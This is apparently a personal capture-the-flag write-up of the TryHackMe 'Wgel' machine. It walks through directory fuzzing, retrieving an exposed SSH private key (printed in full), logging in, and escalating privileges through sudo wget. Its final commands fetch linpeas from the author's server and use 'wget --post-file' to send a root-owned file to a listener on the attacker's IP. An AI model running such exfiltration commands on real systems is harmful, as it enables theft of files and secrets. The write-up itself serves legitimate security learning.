
Greetings folks ! Today I would like to analyze a simple machine called Wgel on TryHackMe platform. Let me start with embedding our ip address to customized domain `wgel.th` on `/etc/hosts`.

Follow each command respectively:

`nano /etc/hosts`

![[TryHackMe/Wgel/images/1.PNG]]


Test for web application instance:

`curl -v wgel.thm`

![[TryHackMe/Wgel/images/2.PNG]]

As you can see above, it seems like a `web application` running on  port `80`.

Content of the `default web server` configuration page can be seen below:

![[TryHackMe/Wgel/images/3.PNG]]

If you already reached through `HTTP` protocol, no need to force to connect with `HTTPS` because the developer should activate it as extended feature ,so by default it is normal not to connect.

`curl -v wgel.thm:443`

![[TryHackMe/Wgel/images/4.PNG]]


On browser part, we can achieve this request by using through two different ways:

- direct protocol addition
![[TryHackMe/Wgel/images/5.PNG]]

- adding ending part
![[TryHackMe/Wgel/images/6.PNG]]

NOTE: Browsers automatically add the protocol ,so no need to replace `:443`.

![[TryHackMe/Wgel/images/7.PNG]]


Since we are dealing with web application, let me apply fuzzing:

## Reconnaissance

First of all, checking `robots.txt` may reveal useful findings ,but there was not any juicy information about the occurence of the file.

![[TryHackMe/Wgel/images/8.PNG]]

Today I wanted to use `GoBuster` to get faster results compared to `dirb` or `dirsearch`.

**Basic Scope**

`gobuster dir -u http://wgel.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt`

Result:
![[TryHackMe/Wgel/images/9.PNG]]

**Medium Scope**

`gobuster dir -u http://wgel.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`

Due to the connectivity issues occured in Bilkent Science A building, I was not able to test entire wordlist. The most identical finding can be seen as `sitemap`.

`/sitemap              (Status: 301) [Size: 306] [--> http://wgel.thm/sitemap/]`

There was a clue about something useful in the `page source`:

![[TryHackMe/Wgel/images/15.PNG]]

It looks like a `username`. Now, switch on deep-dive fuzzing through `/sitemap/` directory. 

**Further Reconnaissance**

`gobuster dir -u http://wgel.thm/sitemap -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt`

![[TryHackMe/Wgel/images/10.PNG]]
Entire endpoints appearing as `default` so that reaching `.ssh` part was the most suitable option on that case.

![[TryHackMe/Wgel/images/11.PNG]]

It might be a `security misconfiguration` since there was not any cases such like in real-world practises :)

`id_rsa` known as private ssh key using for authentication in most SSH sessions. Adversaries who captured such file can connect remote hosts as `unauthorized access`.

Directly paste the RSA private key with using the command below:

`echo "-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
+J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG
/1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE
AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa
M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG
SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv
2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2
p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj
7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I
dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy
GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh
shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97
uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N
LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u
QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW
V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5
hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr
9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu
eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
-----END RSA PRIVATE KEY-----
" >> id_rsa`.

After that try to connect ssh session with the help of the `-i` parameter in `SSH client`:

`ssh -i [id_rsa PATH] [TARGET_IP]`

then I forgot the permissions for file ,so I assigned `777` for the file ,but it gave me an error indicating the permissions were too open:

![[TryHackMe/Wgel/images/13.PNG]]

It should be `600` according to [stackexchange](https://unix.stackexchange.com/questions/257590/ssh-key-permissions-chmod-settings):

![[TryHackMe/Wgel/images/14.PNG]]

`chmod 600 id_rsa` will be enought to assign permissions for the file called `id_rsa`

![[TryHackMe/Wgel/images/16.PNG]]
We are done with recon ! ! !

Reach `user flag` with one-liner:

`cd Documents; cat user_flag.txt`

## Exploitation

As usual, due to the `OSCP` preparation, I always use manual way to pass privilege escalation.

Start with `sudo -l` to understand the commands that the user can run.
![[TryHackMe/Wgel/images/17.PNG]]

Direct OS enumeration is possible via `linpeas`:

reach the source file of [linpeas](https://linpeas.sh/)

![[TryHackMe/Wgel/images/18.PNG]]

Deploy local web server:
`python3 -m http.server 1984`

One-liner to run `linpeas`:

`wget http://10.11.69.113:1984/linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh`

![[TryHackMe/Wgel/images/19.PNG]]

I tried 3 commands at once so as to pass each steps and reduce the time after execution of the `linpeas`.

![[TryHackMe/Wgel/images/20.PNG]]
![[TryHackMe/Wgel/images/21.PNG]]![[TryHackMe/Wgel/images/22.PNG]]

We should find a way to download a reverse shell & located on `root` path & executed.

![[TryHackMe/Wgel/images/24.PNG]]

![[TryHackMe/Wgel/images/25.PNG]]

It did not work because I was not running it on  any `privileged` paths or somewhere:

After a couple of research I found a useful [resource](https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/) about `wget` privilege escalation through `POST` method:

Observe that the approach is completely similar to mine:

![[TryHackMe/Wgel/images/23.PNG]]

What if I try to capture the `root` flag instead of `shadow` and `passwd` files ? I tried to capture the `root.txt` file ,but it is frequently located on `root` path ,so let's try this approach:

To capture `POST` requests:

`nc -lvnp 1111`

Run the command as above:

Since I saw the `user flag` name as `user_flag` pattern, I thought that what exactly happens if we  replace the `user` pattern as `root` :

`sudo wget /usr/bin/wget --post-file=/root/root_flag.txt 10.11.69.113` 

I got it ! ! !

In the first attempt, I did not give specific port the correct way should be likely this:

`sudo wget /usr/bin/wget --post-file=/root/root_flag.txt 10.11.69.113:1111`

![[TryHackMe/Wgel/images/26.PNG]]


May The Pentest Be With You  ! ! !

![[27.jpg]]